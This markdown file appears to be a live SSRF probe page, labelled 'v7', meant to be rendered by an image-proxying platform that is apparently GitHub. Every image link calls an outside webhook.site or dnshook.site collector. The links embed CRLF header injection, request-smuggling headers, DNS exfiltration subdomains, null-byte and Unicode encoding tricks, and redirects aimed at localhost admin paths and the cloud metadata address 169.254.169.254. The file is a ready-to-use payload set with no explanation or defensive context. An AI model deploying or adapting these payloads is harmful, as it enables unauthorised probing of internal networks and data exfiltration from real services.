# SSRF v7 - Fresh Webhook Testing

## Basic Connectivity

![b1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/b1-basic.png)

## CRLF Header Injection

![h1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/h1-host%0d%0aHost:%20internal.github.net.png)

![h2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/h2-xff%0d%0aX-Forwarded-For:%2010.0.0.1.png)

![h3](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/h3-xfh%0d%0aX-Forwarded-Host:%20internal.png)

## Double CRLF (Body Injection)

![d1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/d1-body%0d%0a%0d%0aGET%20/internal%20HTTP/1.1.png)

![d2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/d2-body%0d%0a%0d%0ainternal-data.png)

## Request Smuggling Patterns

![s1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/s1-cl%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/admin.png)

![s2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/s2-te%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0a0.png)

## DNS Exfiltration

![n1](https://v7-canary.136e610f-df46-485b-b57e-d42604727ca2.dnshook.site/n1.png)

![n2](https://v7-github-internal.136e610f-df46-485b-b57e-d42604727ca2.dnshook.site/n2.png)

## Alternative Encodings

![e1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/e1-unicode%e2%80%8btest.png)

![e2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/e2-null%00test.png)

![e3](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/e3-backslash%5c%5ctest.png)

## Fragment/Query Tricks

![q1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/q1?url=http://127.0.0.1/admin)

![q2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/q2#@169.254.169.254)

![q3](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/q3?redirect=//internal.github.net)

---

*v7: Fresh webhook token - 136e610f-df46-485b-b57e-d42604727ca2*
